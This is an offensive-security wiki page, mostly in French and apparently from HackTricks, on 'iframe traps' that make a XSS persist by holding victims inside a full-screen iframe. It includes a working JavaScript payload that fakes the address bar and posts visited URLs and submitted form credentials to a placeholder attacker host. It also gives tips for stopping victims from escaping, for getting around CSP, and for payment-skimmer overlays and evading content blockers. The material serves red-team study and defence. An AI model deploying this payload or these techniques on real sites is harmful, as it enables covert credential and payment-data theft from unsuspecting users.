# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Cette forme d'abus de XSS via des iframes pour voler des informations lorsque l'utilisateur navigue sur la page web a été initialement publiée dans ces 2 articles de trustedsec.com : [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

L'attaque commence sur une page vulnérable à une XSS où il est possible d'empêcher les **victims** de quitter la XSS en les faisant **naviguer within an iframe** qui occupe toute l'application web.

L'attaque XSS chargera essentiellement la page web dans un iframe occupant 100% de l'écran. Par conséquent, la victime **ne remarquera pas qu'elle est inside an iframe**. Ensuite, si la victime navigue sur la page en cliquant sur des liens à l'intérieur de l'iframe (dans le web), elle sera **navigating inside the iframe** avec le JS arbitraire chargé qui vole des informations issues de cette navigation.

De plus, pour rendre cela plus réaliste, il est possible d'utiliser des **listeners** pour vérifier quand un iframe change la location de la page, et mettre à jour l'URL du browser avec ces emplacements afin que l'utilisateur pense qu'il navigue entre des pages en utilisant le browser.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

De plus, il est possible d'utiliser des listeners pour voler des informations sensibles, non seulement les autres pages que la victime visite, mais aussi les données utilisées pour remplir des **forms** et les envoyer (credentials?) ou pour **steal the local storage**...

Bien sûr, les principales limitations sont qu'une **victim fermant l'onglet ou saisissant une autre URL dans le browser échappera à l'iframe**. Une autre façon d'y échapper serait de **refresh the page**, cependant cela peut être partiellement **prevented** en désactivant le menu contextuel du clic droit à chaque fois qu'une nouvelle page est chargée dans l'iframe, ou en détectant quand la souris de l'utilisateur quitte l'iframe — potentiellement pour cliquer sur le bouton de rechargement du browser — et, dans ce cas, l'URL du browser est mise à jour avec l'URL originale vulnérable à XSS ; donc si l'utilisateur la recharge, elle sera à nouveau compromise (notez que ceci n'est pas très stealth).

## Modernised trap (2024+)

* Utiliser un **full‑viewport iframe** plus History/Navigation API pour imiter une navigation réelle.

<details>
<summary>Piège d'iframe full-viewport</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) maintient la barre d'URL externe synchronisée sans leak de l'URL réelle.
* Passez en **fullscreen** pour masquer l'UI du navigateur et dessiner votre propre barre d'adresse/verrou factice.

## Utilisation des overlay & skimmer

* Les marchands compromis remplacent les hosted payment iframes (Stripe, Adyen, etc.) par un **pixel‑perfect overlay** qui transfère les frappes clavier pendant que le frame réel reste en dessous, utilisant parfois des legacy validation APIs pour que le flux ne se brise jamais.
* En piégeant les utilisateurs dans le top frame, on capture les données **autofill/password‑manager** avant qu'ils ne remarquent que la barre d'URL n'a jamais changé.

## Astuces d'évasion observées dans les recherches de 2025

* `about:blank`/`data:` local frames héritent de l'origine parente et contournent certaines heuristiques des content‑blocker ; les iframes imbriqués peuvent respawn même lorsque les extensions suppriment les third‑party frames.
* **Permission propagation** : la réécriture de l'attribut parent `allow` octroie aux nested attacker frames fullscreen/camera/microphone sans changements DOM évidents.

## Conseils OPSEC rapides

* Refocaliser l'iframe quand la souris sort (`mouseleave` sur body) pour empêcher les utilisateurs d'atteindre l'UI du navigateur.
* Désactiver le menu contextuel et les raccourcis courants (`keydown` pour `F11`, `Ctrl+L`, `Ctrl+T`) à l'intérieur du frame pour ralentir les tentatives d'évasion.
* Si CSP bloque les scripts inline, injectez un remote bootstrapper et activez `srcdoc` sur l'iframe pour que votre payload vive en dehors du CSP appliqué à la page principale.

## Liens

{{#ref}}
clickjacking.md
{{#endref}}



## Références

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
